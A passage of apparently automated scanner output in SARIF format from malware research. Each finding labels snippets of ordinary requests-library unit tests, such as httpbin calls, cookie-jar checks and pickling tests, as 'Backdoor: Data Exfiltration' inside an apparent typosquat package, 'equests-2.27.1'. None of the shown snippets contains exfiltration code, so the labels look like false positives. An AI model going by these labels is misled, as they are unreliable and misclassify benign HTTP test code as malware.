                      "text": "        assert resp.status_code == 200\n\n    def test_cannot_send_unprepared_requests(self, httpbin):\n        r = requests.Request(url=httpbin())\n        with pytest.raises(ValueError):\n            requests.Session().send(r)\n\n",
                      "markdown": "`        assert resp.status_code == 200\n\n    def test_cannot_send_unprepared_requests(self, httpbin):\n        r = requests.Request(url=httpbin())\n        with pytest.raises(ValueError):\n            requests.Session().send(r)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1366,
                  "startColumn": 20,
                  "endLine": 1366,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert resp.status_code == 200\n\n    def test_prepared_request_with_hook_is_pickleable(self, httpbin):\n        r = requests.Request('GET', httpbin('get'), hooks=default_hooks())\n        p = r.prepare()\n\n        # Verify PreparedRequest can be pickled\n",
                    "rendered": {
                      "text": "        assert resp.status_code == 200\n\n    def test_prepared_request_with_hook_is_pickleable(self, httpbin):\n        r = requests.Request('GET', httpbin('get'), hooks=default_hooks())\n        p = r.prepare()\n\n        # Verify PreparedRequest can be pickled\n",
                      "markdown": "`        assert resp.status_code == 200\n\n    def test_prepared_request_with_hook_is_pickleable(self, httpbin):\n        r = requests.Request('GET', httpbin('get'), hooks=default_hooks())\n        p = r.prepare()\n\n        # Verify PreparedRequest can be pickled\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1351,
                  "startColumn": 20,
                  "endLine": 1351,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    def test_prepared_request_with_file_is_pickleable(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        r = requests.Request('POST', httpbin('post'), files=files)\n        p = r.prepare()\n\n        # Verify PreparedRequest can be pickled and unpickled\n",
                    "rendered": {
                      "text": "\n    def test_prepared_request_with_file_is_pickleable(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        r = requests.Request('POST', httpbin('post'), files=files)\n        p = r.prepare()\n\n        # Verify PreparedRequest can be pickled and unpickled\n",
                      "markdown": "`\n    def test_prepared_request_with_file_is_pickleable(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        r = requests.Request('POST', httpbin('post'), files=files)\n        p = r.prepare()\n\n        # Verify PreparedRequest can be pickled and unpickled\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1336,
                  "startColumn": 20,
                  "endLine": 1336,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert r.request.headers == pr.request.headers\n\n    def test_prepared_request_is_pickleable(self, httpbin):\n        p = requests.Request('GET', httpbin('get')).prepare()\n\n        # Verify PreparedRequest can be pickled and unpickled\n        r = pickle.loads(pickle.dumps(p))\n",
                    "rendered": {
                      "text": "        assert r.request.headers == pr.request.headers\n\n    def test_prepared_request_is_pickleable(self, httpbin):\n        p = requests.Request('GET', httpbin('get')).prepare()\n\n        # Verify PreparedRequest can be pickled and unpickled\n        r = pickle.loads(pickle.dumps(p))\n",
                      "markdown": "`        assert r.request.headers == pr.request.headers\n\n    def test_prepared_request_is_pickleable(self, httpbin):\n        p = requests.Request('GET', httpbin('get')).prepare()\n\n        # Verify PreparedRequest can be pickled and unpickled\n        r = pickle.loads(pickle.dumps(p))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1324,
                  "startColumn": 20,
                  "endLine": 1324,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            chunks = r.iter_content(\"1024\")\n\n    def test_request_and_response_are_pickleable(self, httpbin):\n        r = requests.get(httpbin('get'))\n\n        # verify we can pickle the original request\n        assert pickle.loads(pickle.dumps(r.request))\n",
                    "rendered": {
                      "text": "            chunks = r.iter_content(\"1024\")\n\n    def test_request_and_response_are_pickleable(self, httpbin):\n        r = requests.get(httpbin('get'))\n\n        # verify we can pickle the original request\n        assert pickle.loads(pickle.dumps(r.request))\n",
                      "markdown": "`            chunks = r.iter_content(\"1024\")\n\n    def test_request_and_response_are_pickleable(self, httpbin):\n        r = requests.get(httpbin('get'))\n\n        # verify we can pickle the original request\n        assert pickle.loads(pickle.dumps(r.request))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1243,
                  "startColumn": 20,
                  "endLine": 1243,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert isinstance(jar.copy().get_policy(), MyCookiePolicy)\n\n    def test_time_elapsed_blank(self, httpbin):\n        r = requests.get(httpbin('get'))\n        td = r.elapsed\n        total_seconds = ((td.microseconds + (td.seconds + td.days * 24 * 3600) * 10**6) / 10**6)\n        assert total_seconds > 0.0\n",
                    "rendered": {
                      "text": "        assert isinstance(jar.copy().get_policy(), MyCookiePolicy)\n\n    def test_time_elapsed_blank(self, httpbin):\n        r = requests.get(httpbin('get'))\n        td = r.elapsed\n        total_seconds = ((td.microseconds + (td.seconds + td.days * 24 * 3600) * 10**6) / 10**6)\n        assert total_seconds > 0.0\n",
                      "markdown": "`        assert isinstance(jar.copy().get_policy(), MyCookiePolicy)\n\n    def test_time_elapsed_blank(self, httpbin):\n        r = requests.get(httpbin('get'))\n        td = r.elapsed\n        total_seconds = ((td.microseconds + (td.seconds + td.days * 24 * 3600) * 10**6) / 10**6)\n        assert total_seconds > 0.0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1232,
                  "startColumn": 15,
                  "endLine": 1232,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        jar.set(key, value, path=path)\n        jar.set(key, value)\n        with pytest.raises(requests.cookies.CookieConflictError):\n            jar.get(key)\n\n    def test_cookie_policy_copy(self):\n        class MyCookiePolicy(cookielib.DefaultCookiePolicy):\n",
                    "rendered": {
                      "text": "        jar.set(key, value, path=path)\n        jar.set(key, value)\n        with pytest.raises(requests.cookies.CookieConflictError):\n            jar.get(key)\n\n    def test_cookie_policy_copy(self):\n        class MyCookiePolicy(cookielib.DefaultCookiePolicy):\n",
                      "markdown": "`        jar.set(key, value, path=path)\n        jar.set(key, value)\n        with pytest.raises(requests.cookies.CookieConflictError):\n            jar.get(key)\n\n    def test_cookie_policy_copy(self):\n        class MyCookiePolicy(cookielib.DefaultCookiePolicy):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1220,
                  "startColumn": 20,
                  "endLine": 1220,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            jar.get(key)\n\n        # Verify that CookieConflictError is not raised if domain is specified\n        cookie = jar.get(key, domain=domain1)\n        assert cookie == value\n\n    def test_cookie_duplicate_names_raises_cookie_conflict_error(self):\n",
                    "rendered": {
                      "text": "            jar.get(key)\n\n        # Verify that CookieConflictError is not raised if domain is specified\n        cookie = jar.get(key, domain=domain1)\n        assert cookie == value\n\n    def test_cookie_duplicate_names_raises_cookie_conflict_error(self):\n",
                      "markdown": "`            jar.get(key)\n\n        # Verify that CookieConflictError is not raised if domain is specified\n        cookie = jar.get(key, domain=domain1)\n        assert cookie == value\n\n    def test_cookie_duplicate_names_raises_cookie_conflict_error(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1217,
                  "startColumn": 15,
                  "endLine": 1217,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\n        # Verify that CookieConflictError is raised if domain is not specified\n        with pytest.raises(requests.cookies.CookieConflictError):\n            jar.get(key)\n\n        # Verify that CookieConflictError is not raised if domain is specified\n        cookie = jar.get(key, domain=domain1)\n",
                    "rendered": {
                      "text": "\n        # Verify that CookieConflictError is raised if domain is not specified\n        with pytest.raises(requests.cookies.CookieConflictError):\n            jar.get(key)\n\n        # Verify that CookieConflictError is not raised if domain is specified\n        cookie = jar.get(key, domain=domain1)\n",
                      "markdown": "`\n        # Verify that CookieConflictError is raised if domain is not specified\n        with pytest.raises(requests.cookies.CookieConflictError):\n            jar.get(key)\n\n        # Verify that CookieConflictError is not raised if domain is specified\n        cookie = jar.get(key, domain=domain1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1071,
                  "startColumn": 27,
                  "endLine": 1071,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            allow_redirects=False,\n            headers={'Host': b'httpbin.org'}\n        )\n        assert resp.cookies.get('cookie') == 'value'\n\n    def test_links(self):\n        r = requests.Response()\n",
                    "rendered": {
                      "text": "            allow_redirects=False,\n            headers={'Host': b'httpbin.org'}\n        )\n        assert resp.cookies.get('cookie') == 'value'\n\n    def test_links(self):\n        r = requests.Response()\n",
                      "markdown": "`            allow_redirects=False,\n            headers={'Host': b'httpbin.org'}\n        )\n        assert resp.cookies.get('cookie') == 'value'\n\n    def test_links(self):\n        r = requests.Response()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1065,
                  "startColumn": 16,
                  "endLine": 1065,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    def test_request_with_bytestring_host(self, httpbin):\n        s = requests.Session()\n        resp = s.request(\n            'GET',\n            httpbin('cookies/set?cookie=value'),\n            allow_redirects=False,\n",
                    "rendered": {
                      "text": "\n    def test_request_with_bytestring_host(self, httpbin):\n        s = requests.Session()\n        resp = s.request(\n            'GET',\n            httpbin('cookies/set?cookie=value'),\n            allow_redirects=False,\n",
                      "markdown": "`\n    def test_request_with_bytestring_host(self, httpbin):\n        s = requests.Session()\n        resp = s.request(\n            'GET',\n            httpbin('cookies/set?cookie=value'),\n            allow_redirects=False,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1058,
                  "startColumn": 22,
                  "endLine": 1058,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            'Dummy-Auth-Test'] == 'dummy-auth-test-ok'\n\n    def test_prepare_request_with_bytestring_url(self):\n        req = requests.Request('GET', b'https://httpbin.org/')\n        s = requests.Session()\n        prep = s.prepare_request(req)\n        assert prep.url == \"https://httpbin.org/\"\n",
                    "rendered": {
                      "text": "            'Dummy-Auth-Test'] == 'dummy-auth-test-ok'\n\n    def test_prepare_request_with_bytestring_url(self):\n        req = requests.Request('GET', b'https://httpbin.org/')\n        s = requests.Session()\n        prep = s.prepare_request(req)\n        assert prep.url == \"https://httpbin.org/\"\n",
                      "markdown": "`            'Dummy-Auth-Test'] == 'dummy-auth-test-ok'\n\n    def test_prepare_request_with_bytestring_url(self):\n        req = requests.Request('GET', b'https://httpbin.org/')\n        s = requests.Session()\n        prep = s.prepare_request(req)\n        assert prep.url == \"https://httpbin.org/\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1045,
                  "startColumn": 22,
                  "endLine": 1045,
                  "endColumn": 31,
                  "snippet": {
                    "text": "                r.headers['Dummy-Auth-Test'] = 'dummy-auth-test-ok'\n                return r\n\n        req = requests.Request('GET', httpbin('headers'))\n        assert not req.auth\n\n        s = requests.Session()\n",
                    "rendered": {
                      "text": "                r.headers['Dummy-Auth-Test'] = 'dummy-auth-test-ok'\n                return r\n\n        req = requests.Request('GET', httpbin('headers'))\n        assert not req.auth\n\n        s = requests.Session()\n",
                      "markdown": "`                r.headers['Dummy-Auth-Test'] = 'dummy-auth-test-ok'\n                return r\n\n        req = requests.Request('GET', httpbin('headers'))\n        assert not req.auth\n\n        s = requests.Session()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1030,
                  "startColumn": 22,
                  "endLine": 1030,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            resp.hook_working = True\n            return resp\n\n        req = requests.Request('GET', httpbin(), hooks={'response': hook})\n        prep = req.prepare()\n\n        s = requests.Session()\n",
                    "rendered": {
                      "text": "            resp.hook_working = True\n            return resp\n\n        req = requests.Request('GET', httpbin(), hooks={'response': hook})\n        prep = req.prepare()\n\n        s = requests.Session()\n",
                      "markdown": "`            resp.hook_working = True\n            return resp\n\n        req = requests.Request('GET', httpbin(), hooks={'response': hook})\n        prep = req.prepare()\n\n        s = requests.Session()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1021,
                  "startColumn": 20,
                  "endLine": 1021,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert hook1 is not hook2\n        s = requests.Session()\n        s.hooks['response'].append(hook2)\n        r = requests.Request('GET', httpbin(), hooks={'response': [hook1]})\n        prep = s.prepare_request(r)\n        assert prep.hooks['response'] == [hook1]\n\n",
                    "rendered": {
                      "text": "        assert hook1 is not hook2\n        s = requests.Session()\n        s.hooks['response'].append(hook2)\n        r = requests.Request('GET', httpbin(), hooks={'response': [hook1]})\n        prep = s.prepare_request(r)\n        assert prep.hooks['response'] == [hook1]\n\n",
                      "markdown": "`        assert hook1 is not hook2\n        s = requests.Session()\n        s.hooks['response'].append(hook2)\n        r = requests.Request('GET', httpbin(), hooks={'response': [hook1]})\n        prep = s.prepare_request(r)\n        assert prep.hooks['response'] == [hook1]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1010,
                  "startColumn": 20,
                  "endLine": 1010,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        hook = lambda x, *args, **kwargs: x\n        s = requests.Session()\n        s.hooks['response'].append(hook)\n        r = requests.Request('GET', httpbin())\n        prep = s.prepare_request(r)\n        assert prep.hooks['response'] != []\n        assert prep.hooks['response'] == [hook]\n",
                    "rendered": {
                      "text": "        hook = lambda x, *args, **kwargs: x\n        s = requests.Session()\n        s.hooks['response'].append(hook)\n        r = requests.Request('GET', httpbin())\n        prep = s.prepare_request(r)\n        assert prep.hooks['response'] != []\n        assert prep.hooks['response'] == [hook]\n",
                      "markdown": "`        hook = lambda x, *args, **kwargs: x\n        s = requests.Session()\n        s.hooks['response'].append(hook)\n        r = requests.Request('GET', httpbin())\n        prep = s.prepare_request(r)\n        assert prep.hooks['response'] != []\n        assert prep.hooks['response'] == [hook]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1002,
                  "startColumn": 20,
                  "endLine": 1002,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            assert kwargs != {}\n\n        s = requests.Session()\n        r = requests.Request('GET', httpbin(), hooks={'response': hook})\n        prep = s.prepare_request(r)\n        s.send(prep)\n\n",
                    "rendered": {
                      "text": "            assert kwargs != {}\n\n        s = requests.Session()\n        r = requests.Request('GET', httpbin(), hooks={'response': hook})\n        prep = s.prepare_request(r)\n        s.send(prep)\n\n",
                      "markdown": "`            assert kwargs != {}\n\n        s = requests.Session()\n        r = requests.Request('GET', httpbin(), hooks={'response': hook})\n        prep = s.prepare_request(r)\n        s.send(prep)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 986,
                  "startColumn": 20,
                  "endLine": 986,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        assert str(e.value) == 'You can only send PreparedRequests.'\n\n    def test_custom_content_type(self, httpbin):\n        r = requests.post(\n            httpbin('post'),\n            data={'stuff': json.dumps({'a': 123})},\n            files={\n",
                    "rendered": {
                      "text": "        assert str(e.value) == 'You can only send PreparedRequests.'\n\n    def test_custom_content_type(self, httpbin):\n        r = requests.post(\n            httpbin('post'),\n            data={'stuff': json.dumps({'a': 123})},\n            files={\n",
                      "markdown": "`        assert str(e.value) == 'You can only send PreparedRequests.'\n\n    def test_custom_content_type(self, httpbin):\n        r = requests.post(\n            httpbin('post'),\n            data={'stuff': json.dumps({'a': 123})},\n            files={\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 979,
                  "startColumn": 22,
                  "endLine": 979,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    def test_non_prepared_request_error(self):\n        s = requests.Session()\n        req = requests.Request(u('POST'), '/')\n\n        with pytest.raises(ValueError) as e:\n            s.send(req)\n",
                    "rendered": {
                      "text": "\n    def test_non_prepared_request_error(self):\n        s = requests.Session()\n        req = requests.Request(u('POST'), '/')\n\n        with pytest.raises(ValueError) as e:\n            s.send(req)\n",
                      "markdown": "`\n    def test_non_prepared_request_error(self):\n        s = requests.Session()\n        req = requests.Request(u('POST'), '/')\n\n        with pytest.raises(ValueError) as e:\n            s.send(req)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 969,
                  "startColumn": 22,
                  "endLine": 969,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    def test_unicode_method_name_with_request_object(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        s = requests.Session()\n        req = requests.Request(u('POST'), httpbin('post'), files=files)\n        prep = s.prepare_request(req)\n        assert isinstance(prep.method, builtin_str)\n        assert prep.method == 'POST'\n",
                    "rendered": {
                      "text": "    def test_unicode_method_name_with_request_object(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        s = requests.Session()\n        req = requests.Request(u('POST'), httpbin('post'), files=files)\n        prep = s.prepare_request(req)\n        assert isinstance(prep.method, builtin_str)\n        assert prep.method == 'POST'\n",
                      "markdown": "`    def test_unicode_method_name_with_request_object(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        s = requests.Session()\n        req = requests.Request(u('POST'), httpbin('post'), files=files)\n        prep = s.prepare_request(req)\n        assert isinstance(prep.method, builtin_str)\n        assert prep.method == 'POST'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 962,
                  "startColumn": 20,
                  "endLine": 962,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    def test_unicode_method_name(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        r = requests.request(\n            method=u('POST'), url=httpbin('post'), files=files)\n        assert r.status_code == 200\n\n",
                    "rendered": {
                      "text": "\n    def test_unicode_method_name(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        r = requests.request(\n            method=u('POST'), url=httpbin('post'), files=files)\n        assert r.status_code == 200\n\n",
                      "markdown": "`\n    def test_unicode_method_name(self, httpbin):\n        files = {'file': open(__file__, 'rb')}\n        r = requests.request(\n            method=u('POST'), url=httpbin('post'), files=files)\n        assert r.status_code == 200\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 952,
                  "startColumn": 20,
                  "endLine": 952,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    def test_unicode_multipart_post_fieldnames(self, httpbin):\n        filename = os.path.splitext(__file__)[0] + '.py'\n        r = requests.Request(\n            method='POST', url=httpbin('post'),\n            data={'stuff'.encode('utf-8'): 'elixr'},\n            files={'file': ('test_requests.py', open(filename, 'rb'))})\n",
                    "rendered": {
                      "text": "\n    def test_unicode_multipart_post_fieldnames(self, httpbin):\n        filename = os.path.splitext(__file__)[0] + '.py'\n        r = requests.Request(\n            method='POST', url=httpbin('post'),\n            data={'stuff'.encode('utf-8'): 'elixr'},\n            files={'file': ('test_requests.py', open(filename, 'rb'))})\n",
                      "markdown": "`\n    def test_unicode_multipart_post_fieldnames(self, httpbin):\n        filename = os.path.splitext(__file__)[0] + '.py'\n        r = requests.Request(\n            method='POST', url=httpbin('post'),\n            data={'stuff'.encode('utf-8'): 'elixr'},\n            files={'file': ('test_requests.py', open(filename, 'rb'))})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 945,
                  "startColumn": 20,
                  "endLine": 945,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            {'stuff': 'elixr'.encode('utf-8')},\n        ))\n    def test_unicode_multipart_post(self, httpbin, data):\n        r = requests.post(httpbin('post'),\n            data=data,\n            files={'file': ('test_requests.py', open(__file__, 'rb'))})\n        assert r.status_code == 200\n",
                    "rendered": {
                      "text": "            {'stuff': 'elixr'.encode('utf-8')},\n        ))\n    def test_unicode_multipart_post(self, httpbin, data):\n        r = requests.post(httpbin('post'),\n            data=data,\n            files={'file': ('test_requests.py', open(__file__, 'rb'))})\n        assert r.status_code == 200\n",
